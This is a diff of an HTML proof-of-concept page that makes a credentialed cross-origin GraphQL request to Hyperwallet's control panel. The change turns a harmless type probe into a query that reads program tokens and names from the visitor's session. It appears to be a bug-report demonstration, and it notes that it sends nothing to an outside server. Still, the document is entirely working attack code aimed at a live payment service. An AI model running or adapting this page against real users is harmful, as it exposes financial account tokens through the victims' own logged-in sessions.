@@ -1,24 +1,21 @@
-  <!DOCTYPE html>                                                                                                                                                    
-  <html>
+<!DOCTYPE html>                                                                                                                                                    
+  <html>                                                                                                                                                             
   <body>                                                                                                                                                             
-  <pre id="out">Loading...</pre>                                                                                                                                   
-  <script>                                                                                                                                                           
-  fetch('https://controlpanel.hyperwallet.com/graphql', {                                                                                                          
-    method: 'POST',
+  <script>        
+  fetch('https://controlpanel.hyperwallet.com/graphql', {
+    method: 'POST',                                                                                                                                                  
     credentials: 'include',
-    headers: {
+    headers: {                                                                                                                                                       
       'Content-Type': 'application/graphql',
-      'Accept': 'application/json'
+      'Accept': 'application/json'                                                                                                                                   
     },
-    body: '{ __typename }'
-  })
+    body: '{ programs { nodes { token name } } }'                                                                                                                    
+  })                                                                                                                                                                 
   .then(r => r.json())
   .then(data => {                                                                                                                                                    
-    document.getElementById("out").innerText = JSON.stringify(data, null, 2);
-  })                                                                                                                                                                 
-  .catch(e => {                                                                                                                                                    
-    document.getElementById("out").innerText = "Error: " + e;
+    document.body.innerText = JSON.stringify(data);
+    // Shows data in page — no exfiltration to external server                                                                                                       
   });                                                                                                                                                                
-  </script>
+  </script>                                                                                                                                                          
   </body>                                                                                                                                                            
   </html>  
